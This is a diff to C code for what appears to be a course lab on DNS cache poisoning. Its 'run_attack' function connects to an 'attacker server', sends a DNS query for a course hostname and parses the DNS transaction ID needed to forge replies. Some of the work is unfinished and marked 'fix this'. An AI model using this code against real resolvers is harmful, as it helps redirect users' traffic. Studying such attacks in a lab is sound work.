@@ -12,57 +12,6 @@
 
 int build_dns_query(unsigned char *buffer, const char *hostname);
 
-int fetch_txid_from_server(unsigned short *txid) {
-    int sockfd;
-    struct sockaddr_in server_addr;
-    char buffer[BUFFER_SIZE];
-    socklen_t server_addr_len = sizeof(server_addr);
-
-    // Step 1: Create a UDP socket
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0) {
-        perror("Socket creation failed");
-        return -1;
-    }
-
-    // Step 2: Configure the server address
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(INFO_SERVER_PORT);
-    inet_pton(AF_INET, INFO_SERVER_IP, &server_addr.sin_addr);
-
-    // Step 3: Send a request to the server
-    const char *request = "Request TXID";
-    if (sendto(sockfd, request, strlen(request), 0, (struct sockaddr *)&server_addr, server_addr_len) < 0) {
-        perror("Failed to send request to server");
-        close(sockfd);
-        return -1;
-    }
-    
-    // Step 4: Receive the TXID from the server
-    int received_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&server_addr, &server_addr_len);
-    if (received_len < 0) {
-        perror("Failed to receive data from server");
-        close(sockfd);
-        return -1;
-    }
-
-    buffer[received_len] = '\0';
-    printf("Received from server: %s\n", buffer);
-
-    // Parse the TXID
-    if (sscanf(buffer, "TXID: %hu", txid) != 1) {
-        fprintf(stderr, "Failed to parse TXID from server response\n");
-        close(sockfd);
-        return -1;
-    }
-
-    // Close the socket
-    close(sockfd);
-    return 0;
-}
-
-
 int socket_creation(struct sockaddr_in *server_addr){
     // Create a socket
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -91,14 +40,14 @@ int socket_creation(struct sockaddr_in *server_addr){
 // Function to communicate with the info server and get the txid
 void run_attack(unsigned short *txid_ls) {
     // connect to server attacker
-    // int sockfd1;
-    // struct sockaddr_in server_addr1;
-    // char txid_buffer[BUFFER_SIZE];
-    // unsigned short txid = 0;
+    int sockfd1;
+    struct sockaddr_in server_addr1;
+    char txid_buffer[BUFFER_SIZE];
+    unsigned short txid = 0;
 
-    // sockfd1 = socket_creation(&server_addr1);
+    sockfd1 = socket_creation(&server_addr1);
     
-    // printf("Attacker server connected: %s:%d\n", inet_ntoa(server_addr1.sin_addr), ntohs(server_addr1.sin_port));
+    printf("Attacker server connected: %s:%d\n", inet_ntoa(server_addr1.sin_addr), ntohs(server_addr1.sin_port));
     
     // send the DNS request  ################ step 1 #####################
     const char *hostname = "www.attacker.cybercourse.com";
@@ -127,33 +76,32 @@ void run_attack(unsigned short *txid_ls) {
         close(sockfd);
         exit(EXIT_FAILURE);
     }
+
+    printf("DNS query sent for hostname: %s\n", hostname);
     
-    close(sockfd);
+    // Receive the txid from the server
+    int bytes_received = recv(sockfd, txid_buffer, BUFFER_SIZE - 1, 0); // fix this
+    if (bytes_received < 0) {
+        perror("Failed to receive data from info server");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
 
-    unsigned short txid = 0;
-    fetch_txid_from_server(&txid);
-    printf("txid got form server is %d", txid);
-    // // Receive the txid from the server
-    // int bytes_received = recv(sockfd, txid_buffer, BUFFER_SIZE - 1, 0);
-    // if (bytes_received < 0) {
-    //     perror("Failed to receive data from info server");
-    //     close(sockfd);
-    //     exit(EXIT_FAILURE);
-    // }
+    txid_buffer[bytes_received] = '\0'; // Null-terminate the received string
+    printf("Received from server: %s\n", txid_buffer);
 
-    // txid_buffer[bytes_received] = '\0'; // Null-terminate the received string
-    // printf("Received from server: %s\n", txid_buffer);
+    // Parse the txid
+    if (sscanf(txid_buffer, "TXID: %hu", &txid) != 1) {
+        fprintf(stderr, "Failed to parse TXID from server response\n");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
 
-    // // Parse the txid
-    // if (sscanf(txid_buffer, "TXID: %hu", &txid) != 1) {
-    //     fprintf(stderr, "Failed to parse TXID from server response\n");
-    //     close(sockfd);
-    //     exit(EXIT_FAILURE);
-    // }
-
-    // printf("Extracted TXID: %u\n", txid);
+    printf("Extracted TXID: %u\n", txid);
     txid_ls[0]= txid;
-    // // Close the connection
+    // Close the connection
+    close(sockfd);
+    close(sockfd1);
 }
 
 
@@ -240,24 +188,24 @@ void send_dns_query(const char *hostname) {
 
     printf("DNS query sent for hostname: %s\n", hostname);
 
-    // // Step 5: Receive the DNS response
-    // socklen_t server_addr_len = sizeof(server_addr);
-    // int response_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&server_addr, &server_addr_len);
-    // if (response_len < 0) {
-    //     perror("Failed to receive DNS response");
-    //     close(sockfd);
-    //     exit(EXIT_FAILURE);
-    // }
+    // Step 5: Receive the DNS response
+    socklen_t server_addr_len = sizeof(server_addr);
+    int response_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&server_addr, &server_addr_len);
+    if (response_len < 0) {
+        perror("Failed to receive DNS response");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
 
-    // printf("DNS response received (%d bytes).\n", response_len);
+    printf("DNS response received (%d bytes).\n", response_len);
 
     // Optional: Print the raw DNS response
-    // printf("Raw DNS Response:\n");
-    // for (int i = 0; i < response_len; i++) {
-    //     printf("%02x ", buffer[i]);
-    //     if ((i + 1) % 16 == 0) printf("\n");
-    // }
-    // printf("\n");
+    printf("Raw DNS Response:\n");
+    for (int i = 0; i < response_len; i++) {
+        printf("%02x ", buffer[i]);
+        if ((i + 1) % 16 == 0) printf("\n");
+    }
+    printf("\n");
 
     // Step 6: Close the socket
     close(sockfd);
